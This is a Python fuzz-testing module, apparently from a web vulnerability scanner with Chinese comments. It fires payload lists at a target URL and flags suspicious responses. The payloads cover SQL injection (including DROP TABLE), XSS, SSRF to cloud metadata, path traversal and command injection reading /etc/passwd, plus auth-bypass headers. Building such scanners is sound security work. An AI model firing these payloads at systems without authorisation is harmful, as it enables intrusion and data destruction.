"""
Fuzz Tester Module
模糊测试模块
"""

import random
import string
import time
import re
import logging
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin

from .enhanced_payloads import EnhancedPayloadManager, create_payload_manager

logger = logging.getLogger(__name__)


@dataclass
class FuzzResult:
    """Fuzz测试结果"""
    url: str
    method: str
    payload: str
    status_code: int
    response_length: int
    is_different: bool
    is_vulnerable: bool
    vul_type: str = ""


class ParameterGenerator:
    """参数生成器"""
    
    COMMON_PARAMS = [
        'id', 'user_id', 'page', 'limit', 'offset', 'sort', 'order',
        'search', 'query', 'filter', 'token', 'key', 'q', 'v',
        'callback', 'jsonp', 'type', 'format', 'lang', 'locale'
    ]
    
    INT_VALUES = ['0', '1', '100', '999', '-1', '999999']
    
    STRING_VALUES = [
        'test', 'admin', 'null', 'undefined', 'null', 'NaN',
        'true', 'false', '<script>', '"><img src=x onerror=alert(1)>'
    ]
    
    @classmethod
    def generate_int_params(cls, param_name: str) -> List[Dict[str, Any]]:
        """生成整数类型参数"""
        return [{param_name: v} for v in cls.INT_VALUES]
    
    @classmethod
    def generate_string_params(cls, param_name: str) -> List[Dict[str, Any]]:
        """生成字符串类型参数"""
        return [{param_name: v} for v in cls.STRING_VALUES]
    
    @classmethod
    def generate_all(cls, param_name: str) -> List[Dict[str, Any]]:
        """生成所有类型参数"""
        return (
            cls.generate_int_params(param_name) +
            cls.generate_string_params(param_name)
        )


class FuzzTester:
    """模糊测试器"""
    
    FUZZ_PAYLOADS = {
        'sql_injection': [
            "'", '"', "OR 1=1", "'; DROP TABLE--",
            "' OR '1'='1", "' OR 1=1--", "admin'--",
            "1' AND '1'='1", "1; DROP TABLE users--",
            "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--",
            "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,SHA1('test'))--"
        ],
        'xss': [
            '<script>', '"><img src=x onerror=alert(1)>',
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<svg onload=alert(1)>"
        ],
        'ssrf': [
            'http://localhost', 'http://127.0.0.1',
            'http://169.254.169.254', 'http://[::1]',
            'http://0.0.0.0', 'http://2130706433'
        ],
        'path_traversal': [
            '../etc/passwd', '..\\..\\windows\\system32',
            '..%2F..%2Fetc%2Fpasswd', '....//....//etc/passwd',
            '../../../../../../etc/passwd', '..%252f..%252f..%252fetc%252fpasswd'
        ]
    }
    
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "1' AND '1'='1",
        "1; DROP TABLE users--"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>"
    ]
    
    COMMAND_PAYLOADS = [
        "; ls",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "&& whoami"
    ]
    
    def __init__(
        self,
        http_client,
        sql_payloads: Optional[List[str]] = None,
        xss_payloads: Optional[List[str]] = None,
        command_payloads: Optional[List[str]] = None,
        use_enhanced_payloads: bool = True
    ):
        self.http_client = http_client
        self.use_enhanced_payloads = use_enhanced_payloads
        
        if use_enhanced_payloads:
            self._payload_manager = create_payload_manager()
            if sql_payloads:
                self._payload_manager.add_custom_payloads('sql_injection', sql_payloads)
            if xss_payloads:
                self._payload_manager.add_custom_payloads('xss', xss_payloads)
            if command_payloads:
                self._payload_manager.add_custom_payloads('command_injection', command_payloads)
            self.sql_payloads = self._payload_manager.get_payloads('sql_injection', count=20)
            self.xss_payloads = self._payload_manager.get_payloads('xss', count=20)
            self.command_payloads = self._payload_manager.get_payloads('command_injection', count=20)
        else:
            self._payload_manager = None
            self.sql_payloads = sql_payloads or self.SQLI_PAYLOADS
            self.xss_payloads = xss_payloads or self.XSS_PAYLOADS
            self.command_payloads = command_payloads or self.COMMAND_PAYLOADS
        
        self._baseline_responses: Dict[str, Dict] = {}
    
    def set_baseline(self, url: str, method: str, response: Dict):
        """设置基线响应"""
        key = f"{method}:{url}"
        self._baseline_responses[key] = {
            'status': response.get('status_code'),
            'length': len(response.get('content', '')),
            'content': response.get('content', '')[:1000]
        }
    
    def _is_different(self, url: str, method: str, response: Dict) -> bool:
        """判断响应是否不同"""
        key = f"{method}:{url}"
        baseline = self._baseline_responses.get(key)
        
        if not baseline:
            return True
        
        if response.get('status_code') != baseline['status']:
            return True
        
        content = response.get('content', '')[:1000]
        if len(content) != baseline['length']:
            if abs(len(content) - baseline['length']) > 100:
                return True
        
        return False
    
    async def fuzz_parameters(
        self,
        url: str,
        method: str,
        params: List[str],
        fuzz_type: str = 'common',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """模糊测试参数"""
        results = []
        
        for param in params:
            param_values = ParameterGenerator.generate_all(param)
            
            for param_dict in param_values:
                full_url = self._build_url(url, param_dict)
                
                response = await self.http_client.request(
                    full_url, method
                )
                
                is_diff = self._is_different(url, method, response)
                
                result = FuzzResult(
                    url=full_url,
                    method=method,
                    payload=str(param_dict),
                    status_code=response.status_code,
                    response_length=len(response.content),
                    is_different=is_diff,
                    is_vulnerable=False
                )
                
                results.append(result)
                
                if callback:
                    callback(result)
        
        return results
    
    async def fuzz_headers(
        self,
        url: str,
        method: str = 'GET',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """测试头部注入"""
        results = []
        
        inject_headers = [
            {'X-Forwarded-For': "'; DROP TABLE users--"},
            {'X-Forwarded-For': '<script>alert(1)</script>'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'Referer': "javascript:alert(1)"},
            {'User-Agent': '<script>alert(1)</script>'}
        ]
        
        for headers in inject_headers:
            try:
                response = await self.http_client.request(
                    url, method, headers=headers
                )
                
                is_vuln = False
                vul_type = ""
                
                for header_name, header_value in headers.items():
                    if header_value in response.content:
                        is_vuln = True
                        vul_type = "Header Injection"
                        break
                
                result = FuzzResult(
                    url=url,
                    method=method,
                    payload=f"Header {list(headers.keys())[0]}: {list(headers.values())[0]}",
                    status_code=response.status_code,
                    response_length=len(response.content),
                    is_different=self._is_different(url, method, response),
                    is_vulnerable=is_vuln,
                    vul_type=vul_type
                )
                
                results.append(result)
                
                if callback:
                    callback(result)
            
            except Exception:
                logger.debug(f"Header fuzz failed for {headers}")
                continue
        
        return results
    
    async def fuzz_sql_injection(
        self,
        url: str,
        method: str = 'GET',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """SQL注入测试"""
        results = []
        
        for payload in self.sql_payloads:
            test_url = f"{url}{'?id=' if '?' not in url else '&id='}{payload}"
            
            response = await self.http_client.request(test_url, method)
            
            is_vuln = self._check_sql_error(response.content)
            is_diff = self._is_different(url, method, response)
            
            result = FuzzResult(
                url=test_url,
                method=method,
                payload=payload,
                status_code=response.status_code,
                response_length=len(response.content),
                is_different=is_diff,
                is_vulnerable=is_vuln,
                vul_type='SQL Injection' if is_vuln else ''
            )
            
            results.append(result)
            
            if callback:
                callback(result)
        
        return results
    
    async def fuzz_xss(
        self,
        url: str,
        method: str = 'GET',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """XSS测试"""
        results = []
        
        for payload in self.xss_payloads:
            test_url = f"{url}{'?q=' if '?' not in url else '&q='}{payload}"
            
            response = await self.http_client.request(test_url, method)
            
            is_vuln = payload in response.content
            
            result = FuzzResult(
                url=test_url,
                method=method,
                payload=payload,
                status_code=response.status_code,
                response_length=len(response.content),
                is_different=False,
                is_vulnerable=is_vuln,
                vul_type='XSS' if is_vuln else ''
            )
            
            results.append(result)
            
            if callback:
                callback(result)
        
        return results
    
    async def fuzz_time_based_sqli(
        self,
        url: str,
        method: str = 'GET',
        param_name: str = 'id',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """时间盲注测试"""
        results = []
        
        if self.use_enhanced_payloads:
            time_payloads = self._payload_manager.get_payloads('sql_injection', 'time_based', count=10)
        else:
            time_payloads = [
                "1' AND SLEEP(5)--",
                "1' AND BENCHMARK(5000000,SHA1('test'))--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' OR SLEEP(5)--"
            ]
        
        baseline_start = time.time()
        try:
            baseline_response = await self.http_client.request(url, method)
            baseline_time = time.time() - baseline_start
        except Exception:
            logger.debug("Failed to get baseline response for time-based SQLi")
            baseline_time = 0.5
        
        for payload in time_payloads:
            test_url = f"{url}{'?id=' if '?' not in url else '&id='}{payload}"
            
            start_time = time.time()
            try:
                response = await self.http_client.request(test_url, method)
                elapsed = time.time() - start_time
                
                is_vuln = elapsed >= 3
                
                result = FuzzResult(
                    url=test_url,
                    method=method,
                    payload=payload,
                    status_code=response.status_code,
                    response_length=len(response.content),
                    is_different=False,
                    is_vulnerable=is_vuln,
                    vul_type='Time-Based SQLi' if is_vuln else ''
                )
                
                results.append(result)
                
                if callback:
                    callback(result)
            
            except Exception:
                logger.debug(f"Time-based SQLi test failed for payload: {payload}")
                continue
        
        return results
    
    async def fuzz_ssrf(
        self,
        url: str,
        method: str = 'GET',
        param_name: str = 'url',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """SSRF模糊测试"""
        results = []
        
        if self.use_enhanced_payloads:
            ssrf_payloads = self._payload_manager.get_payloads('ssrf', count=20)
        else:
            ssrf_payloads = self.FUZZ_PAYLOADS['ssrf']
        
        for payload in ssrf_payloads:
            test_url = f"{url}{'?url=' if '?' not in url else '&url='}{payload}"
            
            try:
                response = await self.http_client.request(test_url, method)
                
                is_vuln = False
                vul_type = ""
                
                if response.status_code == 200:
                    if any(marker in response.content.lower() for marker in ['ami', 'meta-data', 'instance', 'hostname']):
                        is_vuln = True
                        vul_type = "SSRF (Cloud Metadata)"
                    elif 'localhost' in payload and len(response.content) < 1000:
                        is_vuln = True
                        vul_type = "SSRF"
                
                result = FuzzResult(
                    url=test_url,
                    method=method,
                    payload=payload,
                    status_code=response.status_code,
                    response_length=len(response.content),
                    is_different=False,
                    is_vulnerable=is_vuln,
                    vul_type=vul_type
                )
                
                results.append(result)
                
                if callback:
                    callback(result)
            
            except Exception:
                logger.debug(f"SSRF test failed for payload: {payload}")
                continue
        
        return results
    
    async def fuzz_path_traversal(
        self,
        url: str,
        method: str = 'GET',
        param_name: str = 'file',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """路径遍历测试"""
        results = []
        
        if self.use_enhanced_payloads:
            path_payloads = self._payload_manager.get_payloads('path_traversal', count=20)
        else:
            path_payloads = self.FUZZ_PAYLOADS['path_traversal']
        
        for payload in path_payloads:
            test_url = f"{url}{'?file=' if '?' not in url else '&file='}{payload}"
            
            try:
                response = await self.http_client.request(test_url, method)
                
                is_vuln = False
                vul_type = ""
                
                if response.status_code == 200:
                    if any(marker in response.content for marker in ['root:', 'bin:', 'daemon:', '/etc/passwd']):
                        is_vuln = True
                        vul_type = "Path Traversal"
                
                result = FuzzResult(
                    url=test_url,
                    method=method,
                    payload=payload,
                    status_code=response.status_code,
                    response_length=len(response.content),
                    is_different=False,
                    is_vulnerable=is_vuln,
                    vul_type=vul_type
                )
                
                results.append(result)
                
                if callback:
                    callback(result)
            
            except Exception:
                logger.debug(f"Path traversal test failed for payload: {payload}")
                continue
        
        return results
    
    async def fuzz_auth_bypass(
        self,
        url: str,
        method: str = 'GET',
        callback: Optional[Callable] = None
    ) -> List[FuzzResult]:
        """认证绕过测试"""
        results = []
        
        bypass_payloads = [
            {'path': '/admin'},
            {'path': '/admin/'},
            {'path': '/ADMIN'},
            {'path': '/admin.json'},
            {'path': '/../admin'},
            {'headers': {'X-Original-URL': '/admin'}},
            {'headers': {'X-Rewrite-URL': '/admin'}},
            {'headers': {'X-Forwarded-For': '127.0.0.1'}},
            {'headers': {'X-Real-IP': '127.0.0.1'}},
            {'headers': {'Cookie': 'admin=1'}},
            {'headers': {'Authorization': 'Basic YWRtaW46YWRtaW4='}},
            {'headers': {'X-API-Key': 'admin'}}
        ]
        
        for bypass in bypass_payloads:
            try:
                path = bypass.get('path', url)
                headers = bypass.get('headers', {})
                
                response = await self.http_client.request(path, method, headers=headers)
                
                is_vuln = False
                vul_type = ""
                
                if response.status_code == 200:
                    content_lower = response.content.lower()
                    if any(marker in content_lower for marker in ['admin', 'dashboard', 'config', 'settings']):
                        is_vuln = True
                        vul_type = "Auth Bypass"
                
                result = FuzzResult(
                    url=path,
                    method=method,
                    payload=str(bypass),
                    status_code=response.status_code,
                    response_length=len(response.content),
                    is_different=False,
                    is_vulnerable=is_vuln,
                    vul_type=vul_type
                )
                
                results.append(result)
                
                if callback:
                    callback(result)
            
            except Exception as e:
                logger.debug(f"Auth bypass test failed for bypass: {bypass}: {e}")
                continue
        
        return results
    
    def _build_url(self, base: str, params: Dict[str, Any]) -> str:
        """构建带参数的URL"""
        if '?' in base:
            separator = '&'
        else:
            separator = '?'
        
        param_str = '&'.join(f"{k}={v}" for k, v in params.items())
        return f"{base}{separator}{param_str}"
    
    def _check_sql_error(self, content: str) -> bool:
        """检查SQL错误"""
        sql_errors = [
            'sql', 'syntax', 'mysql', 'postgresql', 'oracle',
            'microsoft sql', 'sqlite', 'mariadb', 'warning',
            'mysql_fetch', 'sql error', 'odbc', 'sqlite3'
        ]
        
        content_lower = content.lower()
        return any(err in content_lower for err in sql_errors)
